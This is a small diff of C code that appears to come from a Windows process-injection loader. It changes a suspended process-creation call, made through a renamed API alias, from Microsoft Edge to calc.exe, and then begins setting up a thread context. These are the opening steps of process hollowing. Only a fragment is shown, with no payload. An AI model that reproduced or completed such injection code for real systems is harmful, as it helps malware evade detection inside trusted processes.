@@ -88,7 +88,7 @@ void main_star() {
     PROCESS_INFORMATION pi = {0};
     li.cb = sizeof(li);
 
-    itscreatetPro((LPSTR)"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &li, &pi);
+    itscreatetPro("C:\\windows\\system32\\calc.exe", 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &li, &pi);
     GetTickCount();
 
     CONTEXT ctx = {0};
